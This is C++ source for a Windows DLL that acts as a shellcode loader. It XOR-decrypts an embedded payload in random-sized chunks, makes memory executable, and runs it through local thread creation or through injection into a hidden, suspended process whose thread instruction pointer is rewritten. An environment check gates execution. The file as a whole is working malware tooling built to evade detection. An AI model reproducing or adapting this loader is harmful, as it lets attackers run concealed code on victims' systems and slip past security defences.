// usain.cpp : Defines the exported functions for the DLL application.
//

// I'm too scared to delete any of these headers
// so don't @me about unused headers.
#include "stdafx.h";
#include "RawData.h"
#include "scatterbrain.h"
#include "CheckPlease.h"
#include "Executables.h"
#include "Helpers.h"
#include <Windows.h>
#include <cstdlib>
#include <stdio.h>
#include <thread>
#include <ostream>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include <Winternl.h>
#include <fstream>
#include <future>
#include <filesystem>
#include <list>
#include <map>

// Return the PROCESS_INFORMATION of a given application
// after it's been started hidden and suspended.
PROCESS_INFORMATION processCreator(wchar_t* application)
{
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startupInfo;
	ZeroMemory(&startupInfo, sizeof startupInfo);
	startupInfo.cb = sizeof startupInfo;
	ZeroMemory(&procInfo, sizeof procInfo);
	CreateProcess(
		application,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED,
		NULL,
		NULL,
		&startupInfo,
		&procInfo
	);
	printf("[*] procInfo.dwProcessId: %d\n", procInfo.dwProcessId);
	return procInfo;
}

HANDLE getProcessHandle(PROCESS_INFORMATION procInfo)
{
	HANDLE handle = OpenProcess(0x001F0FFF, false, procInfo.dwProcessId);
	if (handle == NULL)
	{
		throw new std::exception("[-] Could not get a handle on the process.\n");
	}
	return handle;
}

// Helper function to generate a random size to write.
int generateSizeMod()
{
	int n = rand() % 500;
	if (n < 100)
	{
		n += 100;
	}
	return n;
}

// Decrypt bytes of file from index to index+size and store result
// in buffer.
void decryptAllBytes(char* buffer)
{
	std::list<char> returnBytes;
	int j = 0;
	for (int i = 0; i < sizeof rawData; i++)
	{
		if (j == (sizeof cryptor - 1))
		{
			j = 0;
		}
		returnBytes.push_back(rawData[i] ^ cryptor[j]);
		j++;
	}
	j = 0;
	for (std::list<char>::iterator it = returnBytes.begin(); it != returnBytes.end(); ++it) {
		buffer[j] = *it;
		//printf("writing: %d\n", *it);
		j++;
	}
}


void getDecryptedBytes(int index, int size, char* buffer)
{
	std::list<char> returnBytes;
	int j = 0;
	for (int i = 0; i < sizeof rawData; i++)
	{
		if (j == (sizeof cryptor - 1))
		{
			j = 0;
		}
		if (i >= index && i < (index + size))
		{
			returnBytes.push_back(rawData[i] ^ cryptor[j]);
		}
		else if (i >= (index + size))
		{
			break;
		}
		j++;
	}
	j = 0;
	for (std::list<char>::iterator it = returnBytes.begin(); it != returnBytes.end(); ++it) {
		buffer[j] = *it;
		//printf("writing: %d\n", *it);
		j++;
	}
}


DWORD WINAPI ShellcodeThread(LPVOID lpParam)
{
	/*typedef DWORD(WINAPI * SHELLCODE)(void);
	SHELLCODE Shellcode = (SHELLCODE)lpParam;*/
	((void(*)())lpParam)();
	// call shellcode
	return 0;
}

int RunViaCreateThread()
{
	printf("[*] Running via CreateThread.\n");
	srand(time(0));

	int SIZE_MOD = generateSizeMod();
	int totalProceedureBytesWritten = 0;
	HANDLE hProcess = GetCurrentProcess();
	void* picThreadStart = VirtualAllocEx(hProcess, 0, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Loop to write the file to the allocated segment
	while (totalProceedureBytesWritten < sizeof rawData)
	{
		SIZE_T proceedureBytesWritten = 0;
		int randSize = rand() % SIZE_MOD + 1;
		if (totalProceedureBytesWritten + randSize > sizeof(rawData))
		{
			randSize = sizeof(rawData) - totalProceedureBytesWritten - 1;
		}
		char* decryptedBytes = (char*)malloc(sizeof(char) * randSize);
		ZeroMemory(decryptedBytes, sizeof(char) * randSize);
		getDecryptedBytes(totalProceedureBytesWritten, randSize, decryptedBytes);
		SIZE_T decryptedBytesSize = sizeof(decryptedBytes);
		WriteProcessMemory(hProcess, (char*)picThreadStart + totalProceedureBytesWritten, decryptedBytes, randSize, &proceedureBytesWritten);
		totalProceedureBytesWritten += proceedureBytesWritten;
		free(decryptedBytes);
	}
	printf("[*] Number of proceedure bytes written: %d\n", totalProceedureBytesWritten);
	DWORD oldProtect = 0;
	if (VirtualProtect(picThreadStart, sizeof(rawData), PAGE_EXECUTE_READ, &oldProtect))
	{
		printf("[*] Changed page permissions. Initializing routine.\n");
		CloseHandle(hProcess);
		HANDLE hThread = CreateThread(NULL, 0, ShellcodeThread, picThreadStart, 0, NULL);
		printf("[*] hThread: 0x%08x\n", hThread);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		//((void(*)())picThreadStart)();
	}
	else
	{
		printf("Couldn't change page permissions, launcher will fail :\\n");
		//VirtualFree(picThreadStart, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, picThreadStart, 0, MEM_RELEASE);
		CloseHandle(hProcess);
	}
	return 0;
}

int RunViaAllocExecute()
{
	printf("[*] Running via AllocExecute.\n");
	srand(time(0));

	int SIZE_MOD = generateSizeMod();
	int totalProceedureBytesWritten = 0;
	HANDLE hProcess = GetCurrentProcess();
	void* picThreadStart = VirtualAllocEx(hProcess, 0, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Loop to write the file to the allocated segment
	while (totalProceedureBytesWritten < sizeof rawData)
	{
		SIZE_T proceedureBytesWritten = 0;
		int randSize = rand() % SIZE_MOD + 1;
		if (totalProceedureBytesWritten + randSize > sizeof(rawData))
		{
			randSize = sizeof(rawData) - totalProceedureBytesWritten - 1;
		}
		char* decryptedBytes = (char*)malloc(sizeof(char) * randSize);
		ZeroMemory(decryptedBytes, sizeof(char) * randSize);
		getDecryptedBytes(totalProceedureBytesWritten, randSize, decryptedBytes);
		SIZE_T decryptedBytesSize = sizeof(decryptedBytes);
		WriteProcessMemory(hProcess, (char*)picThreadStart + totalProceedureBytesWritten, decryptedBytes, randSize, &proceedureBytesWritten);
		totalProceedureBytesWritten += proceedureBytesWritten;
		free(decryptedBytes);
	}
	printf("[*] Number of proceedure bytes written: %d\n", totalProceedureBytesWritten);
	DWORD oldProtect = 0;
	if (VirtualProtect(picThreadStart, sizeof(rawData), PAGE_EXECUTE_READ, &oldProtect))
	{
		printf("[*] Changed page permissions. Initializing routine.\n");
		CloseHandle(hProcess);
		((void(*)())picThreadStart)();
	}
	else
	{
		printf("Couldn't change page permissions, launcher will fail :\\n");
		//VirtualFree(picThreadStart, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, picThreadStart, 0, MEM_RELEASE);
		CloseHandle(hProcess);
	}
	return 0;
}

// Responsible for running the shellcode.
// Uses CreateRemoteThread and file backing.
int RunViaCreateRemoteThread()
{
	printf("[*] RunViaCreateRemoteThread\n");
	srand(time(0));
	HANDLE hThread = NULL;
	wchar_t* binaryName = NULL;

	// Get an appropriate executable to create
	binaryName = GetValidExecutable();
	PROCESS_INFORMATION procInfo = processCreator(binaryName);
	delete(binaryName);

	//open our target process for writing
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
	//allocate memory for our code in the remote process' address space
	void* pRemoteThread = VirtualAllocEx(hProcess, 0, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// variables to manage bytes written 
	int SIZE_MOD = generateSizeMod();
	int totalProceedureBytesWritten = 0;

	SE_DEBUG_NAME;

	// Loop to write the file to the allocated segment
	while (totalProceedureBytesWritten < sizeof rawData)
	{
		SIZE_T proceedureBytesWritten;
		int randSize = rand() % SIZE_MOD + 1;
		if (totalProceedureBytesWritten + randSize > sizeof(rawData))
		{
			randSize = sizeof(rawData) - totalProceedureBytesWritten - 1;
		}
		char* decryptedBytes = (char*)malloc(sizeof(char) * randSize);
		getDecryptedBytes(totalProceedureBytesWritten, randSize, decryptedBytes);
		WriteProcessMemory(hProcess, (char*)pRemoteThread + totalProceedureBytesWritten, decryptedBytes, randSize, &proceedureBytesWritten);
		totalProceedureBytesWritten += proceedureBytesWritten;
	}
	printf("[*] Number of proceedure bytes written: %d\n", totalProceedureBytesWritten);
	
	// Get handle on a function backed by a file
	void* _loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
	if (_loadLibrary == NULL)
	{
		printf("[X] Can't get LoadLibraryA\n");
		return 1;
	}

	// Now set our pointer back to read/execute
	DWORD oldProtect = 0;
	if (VirtualProtectEx(hProcess, pRemoteThread, sizeof(rawData), PAGE_EXECUTE_READ, &oldProtect))
	{
		printf("[*] Changed page permissions. Initializing routine.\n");
		
		// Suspend the thread and update the RIP
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)_loadLibrary, NULL, CREATE_SUSPENDED, NULL);
		if (hThread == NULL)
		{
			printf("[X] Error creating remote thread.\n");
		}
		else
		{
			CONTEXT ctx;
			ZeroMemory(&ctx, sizeof(CONTEXT));
			ctx.ContextFlags = CONTEXT_CONTROL;
			GetThreadContext(hThread, &ctx);
			printf("[*] Current RIP: %p\n", ctx.Rip);
			printf("[*] Updating...\n");
			ctx.Rip = (DWORD64)pRemoteThread;
			printf("[*] Resuming remote thread.\n");
			SetThreadContext(hThread, &ctx);
			ResumeThread(hThread);
			CloseHandle(hThread);
		}
	}
	else
	{
		printf("Couldn't change page permissions, launcher will fail :\\n");
		VirtualFreeEx(hProcess, pRemoteThread, 0, MEM_RELEASE);
	}
	CloseHandle(hProcess);
	return 0;
}

// This function is the main worker launched from dllmain.
// If you just want to execute the process injection, do detonate.
// Otherwise, leave it as is.
int MonsterMind()
{
	// SafeToExecute defined in CheckPlease.cpp
	// If you wanna change what's defined as safe,
	// edit the function.
	if (SafeToExecute())
	{
		printf("[*] Safe to execute!\n");
		RunViaCreateRemoteThread();
		//RunViaAllocExecute()
		//RunViaCreateThread();
	}
	return 0;
}